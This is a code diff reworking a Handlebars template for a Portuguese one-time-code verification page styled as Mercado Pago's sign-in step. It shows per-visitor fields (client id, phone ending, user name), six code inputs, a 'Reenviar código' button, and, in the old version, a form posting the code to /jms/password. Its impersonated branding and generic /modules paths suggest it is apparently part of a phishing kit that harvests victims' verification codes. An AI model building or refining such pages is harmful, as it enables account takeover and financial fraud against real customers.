@@ -1,45 +1,121 @@
-<div class="container formMail__container">
-    <div class="row">
-        <div class="col-md-6 offset-md-3">
-            <form class="formMail formMail__code verify" method="POST" action="/jms/password">
-                <input type="hidden" name="client" value="{{client.id}}">
-                <header>Informe o código de verificação</header>
+<div class='w-full md:!py-10 m-auto bg-white p-4 font-proxima'>
+    <div class='w-full max-w-container mx-auto md:grid md:grid-cols-[400px_auto] text-black justify-center'>
+        <div class='flex flex-col gap-1 pr-10'>
+            <span class='font-normal text-sm text-black/55'>INÍCIO DE SESSÃO</span>
+            {{#if sms}}
+                <h3 class='text-title leading-lg font-semibold'>Insira o código que enviamos por SMS
+                </h3>
+            {{else}}
+                <h3 class='text-title leading-lg font-semibold'>Digite o código que enviamos por WhatsApp
+                </h3>
+            {{/if}}
 
-                <h5>
-                    Você recebeu um número de 6 dígitos por {{#if sms}}SMS{{else}}Ligação{{/if}}.
-                </h5>
+            {{#if sms}}
+                <span class='font-proxima text-def-sm font-normal text-black/80'>É um código de 6 dígitos enviado ao
+                    telefone terminado em
+                    {{client.phone}}.</span>
+            {{else}}
+                <span class='font-proxima text-def-sm font-normal text-black/80'>É um código de 6 dígitos enviado ao
+                    telefone terminado em
+                    {{client.phone}}.</span>
+            {{/if}}
 
-                <article>
-                    <div class="formMail__inputs">
-                        <span><input type="tel" name="number_1" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
-                        <span><input type="tel" name="number_2" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
-                        <span><input type="tel" name="number_3" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
-                        <span><input type="tel" name="number_4" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
-                        <span><input type="tel" name="number_5" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
-                        <span><input type="tel" name="number_6" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+            <div class='w-full flex flex-col gap-4 mt-3'>
+
+                <div
+                    class='w-full rounded-full p-sm max-w-[230px] h-[50px] border border-black/10 gap-3 grid grid-cols-[30px_auto]'
+                >
+                    <div class='w-[30px] h-[30px] flex justify-center items-center rounded-full bg-curious-blue-400/10'>
+                        <svg aria-hidden='true' width='24' height='24' viewBox='0 0 24 24' fill='#009ee3'><path
+                                fill-rule='evenodd'
+                                clip-rule='evenodd'
+                                d='M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z'
+                                fill='#009ee3'
+                            >
+                            </path><path
+                                d='M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z'
+                                fill='#009ee3'
+                            ></path>
+                        </svg>
+                    </div>
+                    <div class='flex flex-col gap-0'>
+                        <span class='text-black font-normal text-xs'>{{client.user}}</span>
+                        <a class='text-curious-blue-400 font-proxima font-normal !text-xs' href='/modules/conta'>Trocar
+                            conta</a>
+                    </div>
+                </div>
+
+                <hr class='bg-black/10 p-0 max-w-[230px] !h-[2px] !border-none' />
+
+                <a
+                    href='https://mercadopago.com'
+                    class='text-curious-blue-400 font-proxima font-normal !text-sm'
+                >Preciso de ajuda</a>
+            </div>
+        </div>
+
+        <div
+            class='max-w-bxContainer self-start flex flex-col gap-1 pr-10 rounded-lg border border-black/10 py-[16px] px-[40px]'
+        >
+            <form class='flex flex-col formPhones {{#if sms}}isSMS{{/if}}'>
+                <span class='text-black font-normal text-xs mb-1'>Insira o código</span>
+                <div class='grid grid-cols-2 gap-3 max-w-[288px]'>
+                    <div class='grid grid-cols-3 gap-2'>
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_1'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_2'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_3'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
                     </div>
 
-                </article>
+                    <div class='grid grid-cols-3 gap-2'>
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_4'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_5'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
+                        <input
+                            type='text'
+                            inputmode='numeric'
+                            name='cod_6'
+                            class='otp-input h-[48px] text-center flex justify-center items-center shadow-shadowBox rounded-md border-none outline-none'
+                        />
+                    </div>
+                </div>
+                <div class='flex flex-col gap-2 mt-3 items-start mb-4'>
+                    <button class='text-curious-blue-400 !text-sm font-normal font-proxima'>Reenviar código</button>
+                    <div class='grid grid-cols-[auto_207px] gap-2'>
+                        <button
+                            class='bg-curious-blue-400 confirm hover:bg-deep-cerulean-700 font-semibold text-white text-md px-[24px] h-[48px] rounded-md'
+                        >Confirmar código</button>
 
-                {{#if error}}<span class="errorMessageAuth">
-                    <svg class="andes-form-control---error-icon" width="12" height="12" viewBox="0 0 12 12"><defs><rect id="a" width="12" height="12" rx="6"></rect></defs><g fill="none" fill-rule="evenodd"><mask id="b" fill="#fff"><use xlink:href="#a"></use></mask><g mask="url(#b)"><path fill="#F23D4F" d="M-.686-.343h13.371v12.686H-.685z"></path><path fill="#FFF" fill-rule="nonzero" d="M6 7.636a.727.727 0 1 1 0 1.455.727.727 0 0 1 0-1.455zm.727-4.727l-.182 4h-1.09l-.182-4h1.454z"></path></g></g></svg>
-                    <div class="andes-form-control__message">O código está incorreto.</div>
-                </span>{{/if}}
-                
-
-                <footer>
-                    <button class="validate" disabled>Continuar</button>
-                    <button class="resend mt-3" disabled>Reenviar código em 00:<spam>50</spam></button>
-
-                    <a class="subButtom" href="#">Enviar ou outro meio</a>
-                </footer>
+                        <a
+                            href='/modules/conta/authentication/{{client.id}}'
+                            class='bg-wite hover:bg-curious-blue-400/10 whitespace-nowrap flex items-center justify-center font-proxima !font-semibold !text-curious-blue-400 !text-def-sm px-[24px] h-[48px] rounded-md'
+                        >Escolher outro método</a>
+                    </div>
+                </div>
             </form>
-        </div>
-    </div>
-
-    <div class="row formMail__footer">
-        <div class="col-12">
-            Protegido por reCAPTCHA- <a href="https://policies.google.com/terms?hl=pt-BR">Privacidade - Condições</a>
         </div>
     </div>
 </div>
